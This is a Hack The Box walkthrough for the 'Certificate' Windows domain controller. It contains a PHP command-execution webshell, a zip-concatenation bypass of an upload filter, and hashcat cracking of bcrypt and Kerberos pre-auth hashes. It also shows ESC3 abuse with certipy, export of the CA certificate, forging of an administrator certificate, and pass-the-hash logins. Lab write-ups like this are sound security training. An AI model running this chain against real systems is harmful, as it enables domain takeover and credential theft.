---
title: HTB - Certificate
date: 2025-10-05 23:59:00 +0000
toc: true
categories: [windows, active directory]
tags: [webshell, php, netexec, sliver, nxc, hashcat, mysql, wireshark, pcap, certipy, SeManageVolumePrivilege]
media_subpath: /assets/img/certificate
image: certificate.png
description: by using zip concatenation we will bypass the file upload restrictions and upload a php webshell to gain the initial access, after upgrading the access to silver beacon we will setup a port forward to access the database and dump the hashes. after cracking sara's hash and gaining access to the domain controller a pcap file is found, when opening this pcap file in wireshark we will use the cipher data to construct the kerberos Pre Authentication hash for the lion.sk user and crackit with hashcat, after that we will exploit adcs esc3 vulnerability to compromise ryan.k user and finally we will abuse the SeManageVolumePrivilege privilege to dump the certificate authority certificate that contains the private key from the ceritificate store to forgue the administrator certificate.
---
## Initial Access - File Upload
from the nmap scan results, we can see that our target is a windows domain controller with the usual services running
```shell
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 07:26:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:28:07+00:00; +13h37m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:28:07+00:00; +13h37m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:28:07+00:00; +13h37m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-07-15T07:28:05+00:00; +13h37m04s from scanner time.
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 13h37m03s, deviation: 0s, median: 13h37m03s
| smb2-time: 
|   date: 2025-07-15T07:27:26
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.82 seconds
```
browsing the web application running on port 80 and inspecting its features, we can see that we can upload assignments as pdf,docx,
pptx or xslx compressed in a zip file. after trying different file upload bypass techniques, the zip concatenation technique worked.
we will combine two zip files into one zip file, where the first one satisfies all the requirements that the application expects
however the malicious payload will be hidden in the second zip file.
the second zip file will contain this php webshell
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
and the first zip file will will a dummy file with a pdf extension
```shell
deb@debian:/tmp$ touch exericse.pdf
deb@debian:/tmp$ zip exercise.zip exercise.pdf
  adding: exercise.pdf (stored 0%)
deb@debian:/tmp$ zip webshell.zip webshell.php 
  adding: webshell.php (deflated 29%)
deb@debian:/tmp$ cat exercise.zip webshell.zip > rce.zip
deb@debian:/tmp$ file rce.zip 
rce.zip: Zip archive data, at least v1.0 to extract, compression method=store
deb@debian:/tmp$
```
the rce.zip file is uploaded successfuly and we can access the webshell as we can see below
![Desktop View](zip-uploaded.png){: width="1421" height="810" }
![Desktop View](whoami-webshell.png){: width="1421" height="810" }
we can now execute os commands, as we can see above, we are operating as `certificate\xamppuser`
## sara.b - Password Reuse
after upgrading my webshell access to sliver beacon, i will set up a port forward to access the mysql server running locally using
the credentials found in the `db.php` file
```shell
sliver (LONELY_DORY) > cat db.php

<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>

sliver (LONELY_DORY) > portfwd add -b 10.10.16.7:3306 -r 127.0.0.1:3306

[*] Port forwarding 10.10.16.7:3306 -> 127.0.0.1:3306

sliver (LONELY_DORY) >
```
some passwrod hases is found in `certificate_webapp_db` database.
```shell
deb@debian:~/Desktop/htb/Certificate/data/tmp$ mysql -h 10.10.16.7 -u certificate_webapp_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 18
Server version: 10.4.32-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+-----------------------+
| Database              |
+-----------------------+
| certificate_webapp_db |
| information_schema    |
| test                  |
+-----------------------+
3 rows in set (0.663 sec)

MariaDB [(none)]> use certificate_webapp_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [certificate_webapp_db]> show tables;
+---------------------------------+
| Tables_in_certificate_webapp_db |
+---------------------------------+
| course_sessions                 |
| courses                         |
| users                           |
| users_courses                   |
+---------------------------------+
4 rows in set (0.784 sec)

MariaDB [certificate_webapp_db]> select * from users;
+----+------------+-----------+-----------+---------------------------+--------------------------------------------------------------+---------------------+---------+-----------+
| id | first_name | last_name | username  | email                     | password                                                     | created_at          | role    | is_active |
+----+------------+-----------+-----------+---------------------------+--------------------------------------------------------------+---------------------+---------+-----------+
|  1 | Lorra      | Armessa   | Lorra.AAA | lorra.aaa@certificate.htb | $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG | 2024-12-23 12:43:10 | teacher |         1 |
|  6 | Sara       | Laracrof  | Sara1200  | sara1200@gmail.com        | $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK | 2024-12-23 12:47:11 | teacher |         1 |
|  7 | John       | Wood      | Johney    | johny009@mail.com         | $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq | 2024-12-23 13:18:18 | student |         1 |
|  8 | Havok      | Watterson | havokww   | havokww@hotmail.com       | $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti | 2024-12-24 09:08:04 | teacher |         1 |
|  9 | Steven     | Roman     | stev      | steven@yahoo.com          | $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2 | 2024-12-24 12:05:05 | student |         1 |
| 10 | Sara       | Brawn     | sara.b    | sara.b@certificate.htb    | $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6 | 2024-12-25 21:31:26 | admin   |         1 |
| 12 | hh         | dd        | kli       | hh@certificate.htb        | $2y$04$e6xtnAbUGZwNHCMOjQUBW.a1t3Tplrkci.Wg5JvIzY3RqmuY2HT3K | 2025-07-15 18:14:19 | student |         1 |
+----+------------+-----------+-----------+---------------------------+--------------------------------------------------------------+---------------------+---------+-----------+
7 rows in set (0.769 sec)

MariaDB [certificate_webapp_db]>
```
the username `sara.b` found in the databse, is an active directory user
```shell
sliver (LONELY_DORY) > ls /users

C:\users (11 items, 174 B)
==========================
drwxrwxrwx  Administrator                     <dir>  Mon Dec 30 21:33:45 -0700 2024
drwxrwxrwx  akeder.kh                         <dir>  Sat Nov 23 19:59:07 -0700 2024
Lrw-rw-rw-  All Users -> C:\ProgramData       0 B    Sat Sep 15 00:21:46 -0700 2018
dr-xr-xr-x  Default                           <dir>  Sun Nov 03 13:03:35 -0700 2024
Lrw-rw-rw-  Default User -> C:\Users\Default  0 B    Sat Sep 15 00:21:46 -0700 2018
-rw-rw-rw-  desktop.ini                       174 B  Sat Sep 15 00:11:27 -0700 2018
drwxrwxrwx  Lion.SK                           <dir>  Mon Nov 04 01:55:47 -0700 2024
dr-xr-xr-x  Public                            <dir>  Sun Nov 03 02:05:55 -0700 2024
drwxrwxrwx  Ryan.K                            <dir>  Sun Nov 03 20:26:18 -0700 2024
drwxrwxrwx  Sara.B                            <dir>  Tue Nov 26 17:12:11 -0700 2024
drwxrwxrwx  xamppuser                         <dir>  Sun Dec 29 18:30:35 -0700 2024


sliver (LONELY_DORY) >
```
so let's see if we can crack her password.
```shell
bed@debian:~/rexkyris/certificate$ hashcat -m 3200 hash.txt ../rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 2738/5540 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921510
* Keyspace..: 14344385

$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8U...kZNdH6
Time.Started.....: Tue Jul 15 22:51:02 2025 (4 secs)
Time.Estimated...: Tue Jul 15 22:51:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3479 H/s (3.69ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12224/14344385 (0.09%)
Rejected.........: 0/12224 (0.00%)
Restore.Point....: 12208/14344385 (0.09%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
Candidate.Engine.: Device Generator
Candidates.#1....: cocktail -> Angels
Hardware.Mon.#1..: Temp: 73c Util: 94%

Started: Tue Jul 15 22:50:23 2025
Stopped: Tue Jul 15 22:51:07 2025
bed@debian:~/rexkyris/certificate$
```
the password is successfully recovered, now let's see if she reused her password by authenticating to the domain.
```shell
deb@debian:~/Desktop/htb/Certificate/data/tmp$ nxc ldap 10.10.11.71 -u sara.b -p Blink182
LDAP        10.10.11.71     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
LDAP        10.10.11.71     389    DC01             [+] certificate.htb\sara.b:Blink182 
deb@debian:~/Desktop/htb/Certificate/data/tmp$
```
and she did.
## Lion.SK - Kerberos Pre-Auth Timestamp Decryption
a `pcap` file is found under the path `C:\Users\Sara.B\Documents\ws-01` as we can see below
```shell
deb@debian:~/Desktop/htb/Certificate/data/tmp/ws-01$ evil-winrm -i 10.10.11.71 -u sara.b -p Blink182
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> ls


    Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01


*Evil-WinRM* PS C:\Users\Sara.B\Documents> cd ws-01
*Evil-WinRM* PS C:\Users\Sara.B\Documents\ws-01> ls


    Directory: C:\Users\Sara.B\Documents\ws-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap


c*Evil-WinRM* PS C:\Users\Sara.B\Documents\ws-01>
```
downloading the `WS-01_PktMon.pcap` file and import it to `wireshark`, we can see that a user called `Lion.SK` is trying 
to authenticate to the domain.
the messages `AS-REQ` and `AS-REP` are kerberos `pre-authentication` steps before the `kdc` sends the `tgt` to the user.
![Desktop View](wireshark.png){: width="1600" height="900" }
the `AS-REQ` packet contains the `timestamp data` encrypted with `lion.sk` `secret key`, we will extract this data and try to 
`decrypt` it, if the decryption is successfull it means we recovered `lion's` password.
the `cipher` value is the data we need to crack
![Desktop View](copying-the-tgt-hash-from-wireshark.png){: width="1600" height="900" }
using the cipher value, we will construct a `hash` format that `hashcat` will understand, it should be like this
```shell
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```
now let's if it can be decrypted
```shell
bed@debian:~/rexkyris/certificate$ hashcat --username -m 19900 lion.txt ../rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 2738/5540 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921510
* Keyspace..: 14344385

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
Time.Started.....: Wed Jul 16 13:29:57 2025 (3 secs)
Time.Estimated...: Wed Jul 16 13:30:00 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6615 H/s (9.56ms) @ Accel:128 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336/14344385 (0.10%)
Rejected.........: 0/14336 (0.00%)
Restore.Point....: 13824/14344385 (0.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3584-4095
Candidate.Engine.: Device Generator
Candidates.#1....: gerber -> chanda
Hardware.Mon.#1..: Temp: 81c Util: 97%

Started: Wed Jul 16 13:29:38 2025
Stopped: Wed Jul 16 13:30:01 2025
bed@debian:~/rexkyris/certificate$
```
and it did, we successfully recovered `lion.sk` domain password
`lion.sk` is also a member of `remote managment users` group, let's authenticate and grab the user flag
```shell
deb@debian:~/Desktop/htb/Certificate/data/tmp/ws-01$ evil-winrm -i 10.10.11.71 -u lion.sk -p '!QAZ2wsx'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> ls ../desktop


    Directory: C:\Users\Lion.SK\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/16/2025  11:02 AM             34 user.txt


*Evil-WinRM* PS C:\Users\Lion.SK\Documents>
```
## Ryan.k - ESC3
checking the AD CS for any vulnerabilities using `certipy`, we can see that there is an `esc3` vulnerability
```shell
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp$ certipy find -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ns 10.10.11.71 -stdout
<skip>
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      
<skip>
```
by exploiting `esc3` vulnerability, we successfuly got `ryan.k` ntlm hash
```shell
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca 'Certificate-LTD-CA' -template Delegated-CRA
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 24
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp$ certipy req -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca 'Certificate-LTD-CA' -template SignedUser -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 33
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp$ certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp$
```
## Administrator - CA Certificate
`ryan.sk` has a `SeManageVolumePrivilege` privilege, which can give us full access to the system.
```shell
*Evil-WinRM* PS C:\users\ryan.k\videos> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
*Evil-WinRM* PS C:\users\ryan.k\videos>
```
eventhough this privilege gives us `read/write` access to system files, i didn't manage to get a reverse shell as system.
it took me to much time to figure out the escalation path, by listing the `certificate store`, we can see that the 
`Certificate authority` certificate is in the certificate store.
```shell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -store My
My "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft RSA SChannel Cryptographic Provider
Missing stored keyset

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
CertUtil: -store command completed successfully.
*Evil-WinRM* PS C:\Users\Ryan.K\Documents>
```
all what we need to do is to export the `CA certificate` and use it to forgue certificates
```shell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX -p password123 MY 75b2f4bbf31f108945147b466131bdca C:\users\ryan.k\videos\ca.pfx
MY "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
CertUtil: -exportPFX command completed successfully.
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> cd C:\users\ryan.k\videos\
*Evil-WinRM* PS C:\users\ryan.k\videos> ls


    Directory: C:\users\ryan.k\videos


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/17/2025   2:54 PM           2675 ca.pfx


*Evil-WinRM* PS C:\users\ryan.k\videos> download ca.pfx
                                        
Info: Downloading C:\users\ryan.k\videos\ca.pfx to ca.pfx
                                        
Info: Download successful!
*Evil-WinRM* PS C:\users\ryan.k\videos>
```
now will download the certificate to our system and  use `certipy` to forge the `administrator` certificate
```shell
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp/ws-01$ certipy forge -ca-pfx ca.pfx -ca-password password123 -subject 'CN=Administrator,CN=Users,DC=CERTIFICATE,DC=HTB' -o admin.pfx -upn administrator@certificate.htb
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'admin.pfx'
[*] Wrote forged certificate and private key to 'admin.pfx'
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp/ws-01$ certipy auth -dc-ip 10.10.11.71 -pfx admin.pfx -domain certificate.htb
Certipy v5.0.1 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
(python-env) deb@debian:~/Desktop/htb/Certificate/data/tmp/ws-01$
```
let's authenticate now and grab the root flag
```shell
deb@debian:~/Desktop/htb/Certificate/data/tmp/ws-01$ evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certificate\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```




















